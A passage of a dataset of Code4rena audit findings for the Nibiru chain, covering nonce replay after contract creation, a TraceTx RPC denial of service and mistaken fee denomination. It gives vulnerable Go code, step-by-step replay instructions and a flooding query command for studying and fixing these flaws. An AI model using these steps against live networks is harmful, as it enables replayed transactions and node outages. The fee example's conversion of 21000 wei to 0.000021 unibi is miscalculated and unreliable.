it just executes the transaction. As we can see the method in `geth` that's normally used to transition the state increments the sender's nonce by 1 in either case:\n\nhttps://github.com/NibiruChain/go-ethereum/blob/nibiru/geth/core/state_transition.go#L331-L337\n```go\n\tif contractCreation {\n\t\tret, _, st.gas, vmerr = st.evm.Create(sender, st.data, st.gas, st.value)\n\t} else {\n\t\t// Increment the nonce for the next transaction\n\t\tst.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+1)\n\t\tret, st.gas, vmerr = st.evm.Call(sender, st.to(), st.data, st.gas, st.value)\n\t}\n```\nhttps://github.com/NibiruChain/go-ethereum/blob/nibiru/geth/core/vm/evm.go#L498-L501\n```go\nfunc (evm *EVM) Create(caller ContractRef, code []byte, gas uint64, value *big.Int) (ret []byte, contractAddr common.Address, leftOverGas uint64, err error) {\n\tcontractAddr = crypto.CreateAddress(caller.Address(), evm.StateDB.GetNonce(caller.Address()))\n\treturn evm.create(caller, &codeAndHash{code: code}, gas, value, contractAddr, CREATE)\n}\n```\nhttps://github.com/NibiruChain/go-ethereum/blob/7fb652f186b09b81cce9977408e1aff744f4e3ef/core/vm/evm.go#L405-L418\n```go\nfunc (evm *EVM) create(caller ContractRef, codeAndHash *codeAndHash, gas uint64, value *big.Int, address common.Address, typ OpCode) ([]byte, common.Address, uint64, error) {\n\t// Depth check execution. Fail if we're trying to execute above the\n\t// limit.\n\tif evm.depth > int(params.CallCreateDepth) {\n\t\treturn nil, common.Address{}, gas, ErrDepth\n\t}\n\tif !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) {\n\t\treturn nil, common.Address{}, gas, ErrInsufficientBalance\n\t}\n\tnonce := evm.StateDB.GetNonce(caller.Address())\n\tif nonce+1 < nonce {\n\t\treturn nil, common.Address{}, gas, ErrNonceUintOverflow\n\t}\n\tevm.StateDB.SetNonce(caller.Address(), nonce+1)\n```\n\nBut `ApplyEvmMsg()` calls `evmObj.Call()` (`st.evm.Call()` in the above code snippet) directly and does not increment sender's nonce:\n```go\n\tif contractCreation {\n\t\t// take over the nonce management from evm:\n\t\t// - reset sender's nonce to msg.Nonce() before calling evm.\n\t\t// - increase sender's nonce by one no matter the result.\n\t\tstateDB.SetNonce(sender.Address(), msg.Nonce())\n\t\tret, _, leftoverGas, vmErr = evmObj.Create(\n\t\t\tsender,\n\t\t\tmsg.Data(),\n\t\t\tleftoverGas,\n\t\t\tmsgWei,\n\t\t)\n\t\tstateDB.SetNonce(sender.Address(), msg.Nonce()+1)\n\t} else {\n\t\tret, leftoverGas, vmErr = evmObj.Call(\n\t\t\tsender,\n\t\t\t*msg.To(),\n\t\t\tmsg.Data(),\n\t\t\tleftoverGas,\n\t\t\tmsgWei,\n\t\t)\n\t}\n```\n## Proof of Concept\n1. User constructs an **SDK** transaction with 4 `MsgEthereumTx` messages in it.\n2. The first message is an **EVM** transaction that creates a new contract and has a nonce 1.\n3. The next three messages are also **EVM** transactions that transfer ether (unibi as its the native unit of account in Nibiru's EVM) or just call some contracts.\n4. The three messages have nonces of 2, 3 and 4.\n5. The user broadcasts the **SDK** transaction. It passes validation through the Ante handler and is included in the mempool.\n6. The TX is picked up to be processed by the `DeliverTx()` method and the Ante handler is called again.\n7. The Ante handler increments the `MsgEthereumTx` message sender's sequence (nonce) for each **EVM** transaction message.\n8. User's sequence (nonce) in their SDK `x/auth` account is currently 5 (the next consecutive ready-for-use nonce).\n9. `ApplyEvmMsg()` is called to process the first **EVM** transaction message and since it's a contract creation transaction it sets the sender's sequence (nonce) to `msg.Nonce() + 1`. After running the transaction through the geth interpreter, the account `stateObject` properties (like nonce, code hash and account state) are persisted to the `x/evm` module keeper's storage by calling `stateDB.Commit()`. The user account's `Sequence` is now reset to `msg.Nonce() + 1` (equal to 2).\n10. The remaining three messages with nonces (2, 3, and 4) are then executed but the user's sequence (nonce) is still at `2`.\n11. User can now replay their last three messages.\n\n\n| SDK TX Message # | Contract creation | Message nonce | Account sequence set by ante handler | Account sequence after execution                |\n| ---------------- | ----------------- | ------------- | ------------------------------------ | ----------------------------------------------- |\n| 1                | true              | 1             | 1                                    | 1 (set by `ApplyEvmMsg()`)                      |\n| 2                | false             | 2             | 2                                    | 1 (not updated as `contractCreation == false` ) |\n| 3                | false             | 3             | 3                                    | 1                                               |\n| 4                | false             | 4             | 4                                    | 1                                               |\n## Recommended mitigation steps\nSet the sender's nonce to `msg.Nonce() + 1` when `contractCreation` is `false`. \n"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-035", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 35, "page_start": null, "title": "RPC DOS via TraceTx", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L547\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L511\n\n\n# Vulnerability details\n\nThe TraceTx method in x/evm/keeper/grpc_query.go implements a gRPC query interface that allows simulation and tracing of specific transactions based on provided configurations. This method enables users to perform detailed execution simulations for transactions in a block.\n\nHowever, a DOS issue arises during the simulation of predecessor transactions.\n\n---\n\n### Proof of Concept\n\nWithin the TraceTx function, predecessor transactions are simulated first, followed by transaction tracing:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L547\n\n```go\nresult, _, err := k.TraceEthTxMsg(ctx, cfg, txConfig, msg, req.TraceConfig, false, tracerConfig)\nif err != nil {\n    // error will be returned with detailed status from traceTx\n    return nil, err\n}\n```\n\nDuring the simulation of predecessor transactions, an attacker can exploit the process by providing an excessively large number of transactions in the req.Predecessors parameter. This forces the chain to repeatedly compute transaction results, maliciously consuming resources and leading to a denial of service.\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L511\n\n```go\nfor i, tx := range req.Predecessors {\n    ethTx := tx.AsTransaction()\n    msg, err := ethTx.AsMessage(signer, cfg.BaseFeeWei)\n    if err != nil {\n        continue\n    }\n    txConfig.TxHash = ethTx.Hash()\n    txConfig.TxIndex = uint(i)\n    ctx = ctx.WithGasMeter(eth.NewInfiniteGasMeterWithLimit(msg.Gas())).\n        WithKVGasConfig(storetypes.GasConfig{}).\n        WithTransientKVGasConfig(storetypes.GasConfig{})\n    rsp, _, err := k.ApplyEvmMsg(ctx, msg, evm.NewNoOpTracer(), true, cfg, txConfig, false)\n    if err != nil {\n        continue\n    }\n    txConfig.LogIndex += uint(len(rsp.Logs))\n}\n```\n\nAn attacker only needs to send an RPC query with an excessively large --predecessors parameter to trigger the DOS:\n\n```bash\nnibid query evm trace-tx \\\n  --block-number 100 \\\n  --block-time \"2024-11-18T00:00:00Z\" \\\n  --block-hash \"0x123abc...\" \\\n  --proposer-address \"nibiru1xyz...\" \\\n  --predecessors '[{\"hash\":\"0x456def...\",\"nonce\":1,\"from\":\"0xabc123...\",\"to\":\"0xdef456...\"}]' \\\n  --msg '{\"hash\":\"0x789ghi...\",\"nonce\":2,\"from\":\"0xabc123...\",\"to\":\"0xdef456...\",\"data\":\"0x...\"}' \\\n  --trace-config '{\"disableStorage\":false,\"disableMemory\":false}'\n```\n\n---\n\n### Suggested Fixes\n\n- **Limit the number of predecessor transactions**: Set an upper bound on the number of transactions allowed in req.Predecessors to prevent resource abuse.\n- **Enforce a total gas consumption limit**: Add a global gas consumption restriction for the simulation process to avoid infinite computation scenarios.\n- Add Timeout Limitation\n\nSimilar to the timeout mechanism in TraceEthTxMsg, a timeout restriction can be implemented to mitigate potential abuse:\n\n```go\nfunc (k *Keeper) TraceEthTxMsg(\n    ctx sdk.Context,\n    cfg *statedb.EVMConfig,\n    txConfig statedb.TxConfig,\n    msg gethcore.Message,\n    traceConfig *evm.TraceConfig,\n    commitMessage bool,\n    tracerJSONConfig json.RawMessage,\n) (*any, uint, error) {\n    // Assemble the structured logger or the JavaScript tracer\n    var (\n        tracer    tracers.Tracer\n        overrides *gethparams.ChainConfig\n        err       error\n        timeout   = DefaultGethTraceTimeout\n    )\n    if traceConfig == nil {\n        traceConfig = &evm.TraceConfig{}\n    }\n\n    ...\n}\n\n// Re-export of the default tracer timeout from go-ethereum.\n// See \"geth/eth/tracers/api.go\".\nconst DefaultGethTraceTimeout = 5 * time.Second\n```\n\n---\n\nBy adding a similar timeout limitation, the execution of TraceTx can be bounded within a reasonable time frame. This reduces the risk of excessive resource consumption caused by intentionally large input parameters or malicious queries.\n", "sections": {"description_md": null, "impact_md": null, "recommendation_md": null, "poc_md": "### Proof of Concept\n\nWithin the TraceTx function, predecessor transactions are simulated first, followed by transaction tracing:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L547\n\n```go\nresult, _, err := k.TraceEthTxMsg(ctx, cfg, txConfig, msg, req.TraceConfig, false, tracerConfig)\nif err != nil {\n    // error will be returned with detailed status from traceTx\n    return nil, err\n}\n```\n\nDuring the simulation of predecessor transactions, an attacker can exploit the process by providing an excessively large number of transactions in the req.Predecessors parameter. This forces the chain to repeatedly compute transaction results, maliciously consuming resources and leading to a denial of service.\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L511\n\n```go\nfor i, tx := range req.Predecessors {\n    ethTx := tx.AsTransaction()\n    msg, err := ethTx.AsMessage(signer, cfg.BaseFeeWei)\n    if err != nil {\n        continue\n    }\n    txConfig.TxHash = ethTx.Hash()\n    txConfig.TxIndex = uint(i)\n    ctx = ctx.WithGasMeter(eth.NewInfiniteGasMeterWithLimit(msg.Gas())).\n        WithKVGasConfig(storetypes.GasConfig{}).\n        WithTransientKVGasConfig(storetypes.GasConfig{})\n    rsp, _, err := k.ApplyEvmMsg(ctx, msg, evm.NewNoOpTracer(), true, cfg, txConfig, false)\n    if err != nil {\n        continue\n    }\n    txConfig.LogIndex += uint(len(rsp.Logs))\n}\n```\n\nAn attacker only needs to send an RPC query with an excessively large --predecessors parameter to trigger the DOS:\n\n```bash\nnibid query evm trace-tx \\\n  --block-number 100 \\\n  --block-time \"2024-11-18T00:00:00Z\" \\\n  --block-hash \"0x123abc...\" \\\n  --proposer-address \"nibiru1xyz...\" \\\n  --predecessors '[{\"hash\":\"0x456def...\",\"nonce\":1,\"from\":\"0xabc123...\",\"to\":\"0xdef456...\"}]' \\\n  --msg '{\"hash\":\"0x789ghi...\",\"nonce\":2,\"from\":\"0xabc123...\",\"to\":\"0xdef456...\",\"data\":\"0x...\"}' \\\n  --trace-config '{\"disableStorage\":false,\"disableMemory\":false}'\n```\n\n---\n\n### Suggested Fixes\n\n- **Limit the number of predecessor transactions**: Set an upper bound on the number of transactions allowed in req.Predecessors to prevent resource abuse.\n- **Enforce a total gas consumption limit**: Add a global gas consumption restriction for the simulation process to avoid infinite computation scenarios.\n- Add Timeout Limitation\n\nSimilar to the timeout mechanism in TraceEthTxMsg, a timeout restriction can be implemented to mitigate potential abuse:\n\n```go\nfunc (k *Keeper) TraceEthTxMsg(\n    ctx sdk.Context,\n    cfg *statedb.EVMConfig,\n    txConfig statedb.TxConfig,\n    msg gethcore.Message,\n    traceConfig *evm.TraceConfig,\n    commitMessage bool,\n    tracerJSONConfig json.RawMessage,\n) (*any, uint, error) {\n    // Assemble the structured logger or the JavaScript tracer\n    var (\n        tracer    tracers.Tracer\n        overrides *gethparams.ChainConfig\n        err       error\n        timeout   = DefaultGethTraceTimeout\n    )\n    if traceConfig == nil {\n        traceConfig = &evm.TraceConfig{}\n    }\n\n    ...\n}\n\n// Re-export of the default tracer timeout from go-ethereum.\n// See \"geth/eth/tracers/api.go\".\nconst DefaultGethTraceTimeout = 5 * time.Second\n```\n\n---\n\nBy adding a similar timeout limitation, the execution of TraceTx can be bounded within a reasonable time frame. This reduces the risk of excessive resource consumption caused by intentionally large input parameters or malicious queries.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L547\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L511\n\n**container:**\n# Vulnerability details\n\nThe TraceTx method in x/evm/keeper/grpc_query.go implements a gRPC query interface that allows simulation and tracing of specific transactions based on provided configurations. This method enables users to perform detailed execution simulations for transactions in a block.\n\nHowever, a DOS issue arises during the simulation of predecessor transactions.\n\n---\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L547\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L511\n\n\n# Vulnerability details\n\nThe TraceTx method in x/evm/keeper/grpc_query.go implements a gRPC query interface that allows simulation and tracing of specific transactions based on provided configurations. This method enables users to perform detailed execution simulations for transactions in a block.\n\nHowever, a DOS issue arises during the simulation of predecessor transactions.\n\n---\n\n### Proof of Concept\n\nWithin the TraceTx function, predecessor transactions are simulated first, followed by transaction tracing:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L547\n\n```go\nresult, _, err := k.TraceEthTxMsg(ctx, cfg, txConfig, msg, req.TraceConfig, false, tracerConfig)\nif err != nil {\n    // error will be returned with detailed status from traceTx\n    return nil, err\n}\n```\n\nDuring the simulation of predecessor transactions, an attacker can exploit the process by providing an excessively large number of transactions in the req.Predecessors parameter. This forces the chain to repeatedly compute transaction results, maliciously consuming resources and leading to a denial of service.\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L511\n\n```go\nfor i, tx := range req.Predecessors {\n    ethTx := tx.AsTransaction()\n    msg, err := ethTx.AsMessage(signer, cfg.BaseFeeWei)\n    if err != nil {\n        continue\n    }\n    txConfig.TxHash = ethTx.Hash()\n    txConfig.TxIndex = uint(i)\n    ctx = ctx.WithGasMeter(eth.NewInfiniteGasMeterWithLimit(msg.Gas())).\n        WithKVGasConfig(storetypes.GasConfig{}).\n        WithTransientKVGasConfig(storetypes.GasConfig{})\n    rsp, _, err := k.ApplyEvmMsg(ctx, msg, evm.NewNoOpTracer(), true, cfg, txConfig, false)\n    if err != nil {\n        continue\n    }\n    txConfig.LogIndex += uint(len(rsp.Logs))\n}\n```\n\nAn attacker only needs to send an RPC query with an excessively large --predecessors parameter to trigger the DOS:\n\n```bash\nnibid query evm trace-tx \\\n  --block-number 100 \\\n  --block-time \"2024-11-18T00:00:00Z\" \\\n  --block-hash \"0x123abc...\" \\\n  --proposer-address \"nibiru1xyz...\" \\\n  --predecessors '[{\"hash\":\"0x456def...\",\"nonce\":1,\"from\":\"0xabc123...\",\"to\":\"0xdef456...\"}]' \\\n  --msg '{\"hash\":\"0x789ghi...\",\"nonce\":2,\"from\":\"0xabc123...\",\"to\":\"0xdef456...\",\"data\":\"0x...\"}' \\\n  --trace-config '{\"disableStorage\":false,\"disableMemory\":false}'\n```\n\n---\n\n### Suggested Fixes\n\n- **Limit the number of predecessor transactions**: Set an upper bound on the number of transactions allowed in req.Predecessors to prevent resource abuse.\n- **Enforce a total gas consumption limit**: Add a global gas consumption restriction for the simulation process to avoid infinite computation scenarios.\n- Add Timeout Limitation\n\nSimilar to the timeout mechanism in TraceEthTxMsg, a timeout restriction can be implemented to mitigate potential abuse:\n\n```go\nfunc (k *Keeper) TraceEthTxMsg(\n    ctx sdk.Context,\n    cfg *statedb.EVMConfig,\n    txConfig statedb.TxConfig,\n    msg gethcore.Message,\n    traceConfig *evm.TraceConfig,\n    commitMessage bool,\n    tracerJSONConfig json.RawMessage,\n) (*any, uint, error) {\n    // Assemble the structured logger or the JavaScript tracer\n    var (\n        tracer    tracers.Tracer\n        overrides *gethparams.ChainConfig\n        err       error\n        timeout   = DefaultGethTraceTimeout\n    )\n    if traceConfig == nil {\n        traceConfig = &evm.TraceConfig{}\n    }\n\n    ...\n}\n\n// Re-export of the default tracer timeout from go-ethereum.\n// See \"geth/eth/tracers/api.go\".\nconst DefaultGethTraceTimeout = 5 * time.Second\n```\n\n---\n\nBy adding a similar timeout limitation, the execution of TraceTx can be bounded within a reasonable time frame. This reduces the risk of excessive resource consumption caused by intentionally large input parameters or malicious queries.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L547\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L511\n\n\n# Vulnerability details\n\nThe TraceTx method in x/evm/keeper/grpc_query.go implements a gRPC query interface that allows simulation and tracing of specific transactions based on provided configurations. This method enables users to perform detailed execution simulations for transactions in a block.\n\nHowever, a DOS issue arises during the simulation of predecessor transactions.\n\n---\n\n### Proof of Concept\n\nWithin the TraceTx function, predecessor transactions are simulated first, followed by transaction tracing:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L547\n\n```go\nresult, _, err := k.TraceEthTxMsg(ctx, cfg, txConfig, msg, req.TraceConfig, false, tracerConfig)\nif err != nil {\n    // error will be returned with detailed status from traceTx\n    return nil, err\n}\n```\n\nDuring the simulation of predecessor transactions, an attacker can exploit the process by providing an excessively large number of transactions in the req.Predecessors parameter. This forces the chain to repeatedly compute transaction results, maliciously consuming resources and leading to a denial of service.\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/grpc_query.go#L511\n\n```go\nfor i, tx := range req.Predecessors {\n    ethTx := tx.AsTransaction()\n    msg, err := ethTx.AsMessage(signer, cfg.BaseFeeWei)\n    if err != nil {\n        continue\n    }\n    txConfig.TxHash = ethTx.Hash()\n    txConfig.TxIndex = uint(i)\n    ctx = ctx.WithGasMeter(eth.NewInfiniteGasMeterWithLimit(msg.Gas())).\n        WithKVGasConfig(storetypes.GasConfig{}).\n        WithTransientKVGasConfig(storetypes.GasConfig{})\n    rsp, _, err := k.ApplyEvmMsg(ctx, msg, evm.NewNoOpTracer(), true, cfg, txConfig, false)\n    if err != nil {\n        continue\n    }\n    txConfig.LogIndex += uint(len(rsp.Logs))\n}\n```\n\nAn attacker only needs to send an RPC query with an excessively large --predecessors parameter to trigger the DOS:\n\n```bash\nnibid query evm trace-tx \\\n  --block-number 100 \\\n  --block-time \"2024-11-18T00:00:00Z\" \\\n  --block-hash \"0x123abc...\" \\\n  --proposer-address \"nibiru1xyz...\" \\\n  --predecessors '[{\"hash\":\"0x456def...\",\"nonce\":1,\"from\":\"0xabc123...\",\"to\":\"0xdef456...\"}]' \\\n  --msg '{\"hash\":\"0x789ghi...\",\"nonce\":2,\"from\":\"0xabc123...\",\"to\":\"0xdef456...\",\"data\":\"0x...\"}' \\\n  --trace-config '{\"disableStorage\":false,\"disableMemory\":false}'\n```\n\n---\n\n### Suggested Fixes\n\n- **Limit the number of predecessor transactions**: Set an upper bound on the number of transactions allowed in req.Predecessors to prevent resource abuse.\n- **Enforce a total gas consumption limit**: Add a global gas consumption restriction for the simulation process to avoid infinite computation scenarios.\n- Add Timeout Limitation\n\nSimilar to the timeout mechanism in TraceEthTxMsg, a timeout restriction can be implemented to mitigate potential abuse:\n\n```go\nfunc (k *Keeper) TraceEthTxMsg(\n    ctx sdk.Context,\n    cfg *statedb.EVMConfig,\n    txConfig statedb.TxConfig,\n    msg gethcore.Message,\n    traceConfig *evm.TraceConfig,\n    commitMessage bool,\n    tracerJSONConfig json.RawMessage,\n) (*any, uint, error) {\n    // Assemble the structured logger or the JavaScript tracer\n    var (\n        tracer    tracers.Tracer\n        overrides *gethparams.ChainConfig\n        err       error\n        timeout   = DefaultGethTraceTimeout\n    )\n    if traceConfig == nil {\n        traceConfig = &evm.TraceConfig{}\n    }\n\n    ...\n}\n\n// Re-export of the default tracer timeout from go-ethereum.\n// See \"geth/eth/tracers/api.go\".\nconst DefaultGethTraceTimeout = 5 * time.Second\n```\n\n---\n\nBy adding a similar timeout limitation, the execution of TraceTx can be bounded within a reasonable time frame. This reduces the risk of excessive resource consumption caused by intentionally large input parameters or malicious queries."}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-044", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 44, "page_start": null, "title": "Inconsistent Fee Denomination Handling in Transaction Validation and Building", "short_summary": null, "description_md": "## Finding description and impact\n\nThe Nibiru EVM module incorrectly handles fee denominations during transaction validation and building, failing to convert wei amounts to the native unibi denomination. This can lead to significant discrepancies in fee calculations and potentially allow users to pay far fewer fees than intended.\n\nThe issue occurs in two locations:\n\n1. Transaction validation in `evmante_validate_basic.go`\n2. Transaction building in `msg.go`\n\nIn both cases, fees that are calculated in wei (1e18 units) are directly used with `evm.EVMBankDenom` (unibi), without converting from wei to unibi (1e6 units). This causes an undervaluation of fees by a factor of 10^12, as the system expects fees in unibi but receives them in wei.\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_validate_basic.go#L128\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe Nibiru EVM module incorrectly handles fee denominations during transaction validation and building, failing to convert wei amounts to the native unibi denomination. This can lead to significant discrepancies in fee calculations and potentially allow users to pay far fewer fees than intended.\n\nThe issue occurs in two locations:\n\n1. Transaction validation in `evmante_validate_basic.go`\n2. Transaction building in `msg.go`\n\nIn both cases, fees that are calculated in wei (1e18 units) are directly used with `evm.EVMBankDenom` (unibi), without converting from wei to unibi (1e6 units). This causes an undervaluation of fees by a factor of 10^12, as the system expects fees in unibi but receives them in wei.\n\n## Proof of Concept\n\n1. In `evmante_validate_basic.go`, the fee validation directly uses the wei amount:\n\n```go\ntxFee = txFee.Add(\n    sdk.Coin{\n        Denom:  evm.EVMBankDenom,\n        Amount: sdkmath.NewIntFromBigInt(txData.Fee()), // Fee() returns wei amount\n    },\n)\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_validate_basic.go#L128)\n\n2. Similarly in `msg.go`, when building a transaction:\n\n```go\nfeeAmt := sdkmath.NewIntFromBigInt(txData.Fee())\nif feeAmt.Sign() > 0 {\n    fees = append(fees, sdk.NewCoin(evmDenom, feeAmt)) // Fee() returns wei amount\n}\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/msg.go#L367)\n\nThe `Fee()` function in `tx_data_legacy.go` calculates fees in wei:\n```go\nfunc (tx LegacyTx) Fee() *big.Int {\n    return priceTimesGas(tx.GetGasPrice(), tx.GetGas())\n}\n```\n\nTo demonstrate the impact:\n1. A transaction with a gas price of 1 wei and gas limit of 21000 would result in a fee of 21000 wei\n2. This should be converted to 0.000021 unibi (21000 / 10^12)\n3. However, the current code would set it as 21000 unibi, which is incorrect by a factor of 10^12\n\n## Recommended mitigation steps\n\n1. In `evmante_validate_basic.go`, modify the fee validation to convert from wei to unibi:\n\n```go\ntxFee = txFee.Add(\n    sdk.Coin{\n        Denom:  evm.EVMBankDenom,\n        Amount: sdkmath.NewIntFromBigInt(evm.WeiToNative(txData.Fee())),\n    },\n)\n```\n\n2. In `msg.go`, update the fee conversion in `BuildTx`:\n\n```go\nfeeAmt := sdkmath.NewIntFromBigInt(evm.WeiToNative(txData.Fee()))\nif feeAmt.Sign() > 0 {\n    fees = append(fees, sdk.NewCoin(evmDenom, feeAmt))\n}\n```\n", "sections": {"description_md": "## Finding description and impact\n\nThe Nibiru EVM module incorrectly handles fee denominations during transaction validation and building, failing to convert wei amounts to the native unibi denomination. This can lead to significant discrepancies in fee calculations and potentially allow users to pay far fewer fees than intended.\n\nThe issue occurs in two locations:\n\n1. Transaction validation in `evmante_validate_basic.go`\n2. Transaction building in `msg.go`\n\nIn both cases, fees that are calculated in wei (1e18 units) are directly used with `evm.EVMBankDenom` (unibi), without converting from wei to unibi (1e6 units). This causes an undervaluation of fees by a factor of 10^12, as the system expects fees in unibi but receives them in wei.\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\n\n1. In `evmante_validate_basic.go`, modify the fee validation to convert from wei to unibi:\n\n```go\ntxFee = txFee.Add(\n    sdk.Coin{\n        Denom:  evm.EVMBankDenom,\n        Amount: sdkmath.NewIntFromBigInt(evm.WeiToNative(txData.Fee())),\n    },\n)\n```\n\n2. In `msg.go`, update the fee conversion in `BuildTx`:\n\n```go\nfeeAmt := sdkmath.NewIntFromBigInt(evm.WeiToNative(txData.Fee()))\nif feeAmt.Sign() > 0 {\n    fees = append(fees, sdk.NewCoin(evmDenom, feeAmt))\n}\n```\n", "poc_md": "## Proof of Concept\n\n1. In `evmante_validate_basic.go`, the fee validation directly uses the wei amount:\n\n```go\ntxFee = txFee.Add(\n    sdk.Coin{\n        Denom:  evm.EVMBankDenom,\n        Amount: sdkmath.NewIntFromBigInt(txData.Fee()), // Fee() returns wei amount\n    },\n)\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_validate_basic.go#L128)\n\n2. Similarly in `msg.go`, when building a transaction:\n\n```go\nfeeAmt := sdkmath.NewIntFromBigInt(txData.Fee())\nif feeAmt.Sign() > 0 {\n    fees = append(fees, sdk.NewCoin(evmDenom, feeAmt)) // Fee() returns wei amount\n}\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/msg.go#L367)\n\nThe `Fee()` function in `tx_data_legacy.go` calculates fees in wei:\n```go\nfunc (tx LegacyTx) Fee() *big.Int {\n    return priceTimesGas(tx.GetGasPrice(), tx.GetGas())\n}\n```\n\nTo demonstrate the impact:\n1. A transaction with a gas price of 1 wei and gas limit of 21000 would result in a fee of 21000 wei\n2. This should be converted to 0.000021 unibi (21000 / 10^12)\n3. However, the current code would set it as 21000 unibi, which is incorrect by a factor of 10^12\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_validate_basic.go#L128\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_validate_basic.go#L128\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe Nibiru EVM module incorrectly handles fee denominations during transaction validation and building, failing to convert wei amounts to the native unibi denomination. This can lead to significant discrepancies in fee calculations and potentially allow users to pay far fewer fees than intended.\n\nThe issue occurs in two locations:\n\n1. Transaction validation in `evmante_validate_basic.go`\n2. Transaction building in `msg.go`\n\nIn both cases, fees that are calculated in wei (1e18 units) are directly used with `evm.EVMBankDenom` (unibi), without converting from wei to unibi (1e6 units). This causes an undervaluation of fees by a factor of 10^12, as the system expects fees in unibi but receives them in wei.\n\n## Proof of Concept\n\n1. In `evmante_validate_basic.go`, the fee validation directly uses the wei amount:\n\n```go\ntxFee = txFee.Add(\n    sdk.Coin{\n        Denom:  evm.EVMBankDenom,\n        Amount: sdkmath.NewIntFromBigInt(txData.Fee()), // Fee() returns wei amount\n    },\n)\n```\n[Link to code](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/app/evmante/evmante_validate_basic.go#L128)\n\n2. Similarly in `msg.go`, when building a transaction:\n\n```go\nfeeAmt := sdkmath.NewIntFromBigInt(txData.Fee())\nif feeAmt.Sign() > 0 {\n    